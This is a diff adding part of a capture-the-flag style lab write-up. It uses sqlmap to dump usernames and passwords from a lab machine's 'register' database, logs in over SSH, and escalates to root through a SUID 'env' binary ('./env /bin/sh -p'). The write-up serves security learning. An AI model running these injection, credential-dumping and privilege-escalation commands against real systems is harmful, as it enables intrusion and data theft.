@@ -122,7 +122,64 @@ Trying this method we obtain the username and the password. (Not common but we w
 
 Other method of sql injection can be ```sqlmap```.
 
+### SQL Injection: sqlmap
 
+Sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.
 
+```sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch```
 
+- -u: -u URL, --url=URL   Target URL. (e.g. "http://www.site.com/vuln.php?id=1")
+- --forms: Parse and test forms on target URL. Parameter(s) for testing in the provided data.
+- --dbs: Enumerate DBMS databases. (As seen in the next image)
+- --batch: Never ask for user input, use the default behavior. (Automatic Y/N response to the questions)
 
+![imagen](https://github.com/user-attachments/assets/75d8ce95-4508-4cfe-aec5-cd11a500a25e)
+
+As we have encountered a login page, our target here seems to be the ```register database```. Let's check it.
+
+```sqlmap -u http://172.17.0.2/index.php --forms -D register --tables --batch```
+
+- -D DB: DBMS database to enumerate.
+- --tables: Enumerate DBMS database tables.
+
+![imagen](https://github.com/user-attachments/assets/7b4cb887-b38b-4cbc-a2c9-cb144ed18614)
+
+We found one table inside the register DB and looks promising as it is called ```users```.
+
+```sqlmap -u http://172.17.0.2/index.php --forms -D register -T users --columns --batch```
+
+- -T TBL: DBMS database table(s) to enumerate.
+- --columns: Enumerate DBMS database table columns.
+
+![imagen](https://github.com/user-attachments/assets/6faae46e-07fa-4b16-bed8-eac0cbafa3c1)
+
+We are so close. Just one more step and we will obtain the username and password listed in the DB.
+
+```sqlmap -u http://172.17.0.2/index.php --forms -D register -T users -C passwd,username --dump --batch```
+
+- -C COL: DBMS database table column(s) to enumerate
+- --dump: Dump DBMS database table entries
+
+![imagen](https://github.com/user-attachments/assets/39b77686-546d-4fad-8c03-b04c8cc55154)
+
+We got it! And the information has been stored in a .csv so we can access it later on.
+(For example, in this case ```cat /home/kali/.local/share/sqlmap/output/172.17.0.2/dump/register/users.csv ```)
+Let's try to access via ssh. (Remember port 22 was open)
+
+![imagen](https://github.com/user-attachments/assets/37ba6292-0214-4a58-b461-9f0c596284b9)
+
+###  Privilege Escalation
+
+As Dylan, we don't have many privileges. This means we cannot access most of the information. We need to find a way to become root. Firstly, we can check which permits does ```sudo``` have. None. Let's try other method: suid permits.
+
+![imagen](https://github.com/user-attachments/assets/b68b9926-4d29-4365-8d4a-a2dbc1a01605)
+
+Once we have stablished the permits suid has, let look up in [GTFOBins](https://gtfobins.github.io/) how we can exploit those permits. Let's try with ```env``` for example
+
+If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.
+
+```./env /bin/sh -p```
+
+![imagen](https://github.com/user-attachments/assets/36bb87b4-0a3c-4949-b3d7-443b0364ca58)
+
+We are root!
